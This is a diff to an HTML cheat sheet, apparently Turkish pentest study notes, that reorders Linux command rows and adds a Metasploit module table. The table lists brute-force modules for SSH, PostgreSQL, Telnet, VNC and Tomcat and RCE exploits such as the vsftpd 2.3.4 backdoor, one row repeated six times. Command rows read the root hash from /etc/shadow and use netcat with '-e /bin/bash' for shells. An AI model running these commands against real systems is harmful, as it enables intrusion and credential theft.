@@ -28,17 +28,17 @@
     <tr><td class="kod">ps -aux | grep sshd</td><td class="desc">sshd servisinin çalışıp çalışmadığını gösterir.</td></tr>
     <tr><td class="kod">grep "a" file</td><td class="desc">Dosya içinde arama yapar. -v hariç -i büyük/küçük uyumu kaldırır. -R recursive arama yapar.</td></tr>
     <tr><td class="kod">tree -d -L 3</td><td class="desc">Agac yapisiyla listeleme yapar. -d directory -L derinlik</td></tr>
-    <tr><td class="kod">telnet host ip</td><td class="desc">Port kontrolü için işe yarar. İlkel ssh</td></tr>
     <tr><td class="kod">pkill ssh</td><td class="desc">ssh processini öldürür. -t -u user #user in tum processlerini oldurur.</td></tr>
     <tr><td class="kod">bg</td><td class="desc">Backgroundtaki işlemleri gösterir. fg % id ile ön plana alınır.</td></tr>
     <tr><td class="kod">watch -n 2 ‘command’</td><td class="desc">2 saniyede bir verilen komutu koşar sonuc gosterir.</td></tr>
     <tr><td class="kod">macchanger</td><td class="desc">Mac adresi değiştirme -r random mac verir. Alternatif= ifconfig eth0 hw ether 00:01:02:03:04:05</td></tr>
+    <tr><td class="kod">cat /etc/shadow | grep root | cut -d ':' -f 2</td><td class="desc">root kullanıcısının hash sifresini verir.</td></tr>
     <tr><td class="kod">iptables -A INPUT -p tcp —dport ssh -s ip -j REJECT</td><td class="desc">-A [INPUT|OUTPUT|FORWARD] -p protocol -dport port -s ip -j [ACCEPT|REJECT|DROP]</td></tr>
     <tr><td class="kod">iptables -L</td><td class="desc">iptables kurallarını listeler. -F tüm kuralları siler.</td></tr>
     <tr><td class="kod">iptables -D INPUT 1</td><td class="desc">1 numaralı input kuralını siler.</td></tr>
-    <tr><td class="kod">cat /etc/shadow | grep root | cut -d ':' -f 2</td><td class="desc">root kullanıcısının hash sifresini verir.</td></tr>
     <tr><td class="kod">nc -vlp 4444</td><td class="desc">4444 portu dinler. -e /bin/bash yazan shell verir.</td></tr>
-    <tr><td class="kod">nc -vvn ip port</td><td class="desc">verilen ip ve porta baglanır. -e /bin/bash yazan shell verir.</td></tr>
+    <tr><td class="kod">nc -vvn ip port</td><td class="desc">verilen ip ve porta baglanır. -e /bin/bash yazan shell verir. backdoor varsa shell alır.</td></tr>
+    <tr><td class="kod">telnet host ip</td><td class="desc">Port kontrolü için işe yarar. İlkel ssh</td></tr>
 
     <tr><td><br></td></tr>
     <tr><th>awk & sed</th><th>Description</th></tr>
@@ -86,9 +86,32 @@
 </br></hr>
 <span>Bulunan servis hakkında online zafiyet tarama <a href="http://www.cvedetails.com" target="_blank">www.cvedetails.com</a></span>
 </div>
+<tr><th>Bilinen Metasploit Modülleri</th><th>Description</th></tr>
+<tr><td class="kod">auxiliary/scanner/ssh/ssh_login</td><td class="desc">ssh Bruteforce</td></tr>
+<tr><td class="kod">auxiliary/scanner/postgres/postgres_login</td><td class="desc">PostgreSQL Bruteforce | postgres -U [user] -h [ip]</td></tr>
+<tr><td class="kod">auxiliary/scanner/telnet/telnet_login</td><td class="desc">Telnet Bruteforce</td></tr>
+<tr><td class="kod">auxiliary/scanner/telnet/telnet_version</td><td class="desc">Telnet Version erisim gelebilir</td></tr>
+<tr><td class="kod">auxiliary/scanner/vnc/vnc_login</td><td class="desc">vnc Bruteforce | vncviewer [ip] login sadece password gerekli.</td></tr>
+<tr><td class="kod">auxiliary/scanner/http/tomcat_mgr_login</td><td class="desc">Tomcat 6 BruteForce</td></tr>
 
+<tr><td class="kod">auxiliary/scanner/snmp/snmp_enum</td><td class="desc">snmp community stringlerini cekiyor. UDP unutma.</td></tr>
+<tr><td class="kod">exploit/multi/samba/usermap_script</td><td class="desc">#samba 3.x Remote Code Execution</td></tr>
+<tr><td class="kod">exploit/unix/ftp/vsftpd_234_backdoor</td><td class="desc">vsftpd v2.3.4 Remote Code Execution</td></tr>
+<tr><td class="kod">auxiliary/scanner/http/tomcat_mgr_upload</td><td class="desc">Tomcat 6 Remote Code Execution</td></tr>
+
+
+
+<tr><td class="kod">---</td><td class="desc">---</td></tr>
+<tr><td class="kod">exploit/unix/ftp/vsftpd_234_backdoor</td><td class="desc">vsftpd v2.3.4 Backdoor</td></tr>
+<tr><td class="kod">exploit/unix/ftp/vsftpd_234_backdoor</td><td class="desc">vsftpd v2.3.4 Backdoor</td></tr>
+<tr><td class="kod">exploit/unix/ftp/vsftpd_234_backdoor</td><td class="desc">vsftpd v2.3.4 Backdoor</td></tr>
+<tr><td class="kod">exploit/unix/ftp/vsftpd_234_backdoor</td><td class="desc">vsftpd v2.3.4 Backdoor</td></tr>
+<tr><td class="kod">exploit/unix/ftp/vsftpd_234_backdoor</td><td class="desc">vsftpd v2.3.4 Backdoor</td></tr>
+<tr><td class="kod">exploit/unix/ftp/vsftpd_234_backdoor</td><td class="desc">vsftpd v2.3.4 Backdoor</td></tr>
 <div class="tabcontent" id="Metasploit">
-	everything.ssss
+	<table>
+
+  </table>
 </div>
 
 <div class="tabcontent" id="Mobil">
